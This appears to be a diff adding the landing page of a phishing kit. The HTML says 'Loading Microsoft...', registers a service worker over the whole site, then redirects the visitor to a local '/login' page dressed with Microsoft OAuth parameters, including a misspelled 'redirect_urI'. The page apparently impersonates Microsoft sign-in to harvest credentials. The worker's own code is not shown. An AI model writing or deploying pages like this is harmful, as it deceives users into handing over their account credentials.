@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>Redirecting...</title>
+ <script>
+    if ('serviceWorker' in navigator) {
+      window.addEventListener('load', function() {
+         navigator.serviceWorker.register('/worker.js', { scope: '/' })
+            .then(function(registration) {
+               console.log('Service Worker registered');
+                window.location.href ='/login?method=signin&mode=secure&client_id=3ce82761cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
+
+                    });
+            });
+        } else {
+            window.location.href = '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F';
+        }
+    </script>
+</head>
+<body>
+    <p>Loading Microsoft...</p>
+</body>
+</html>
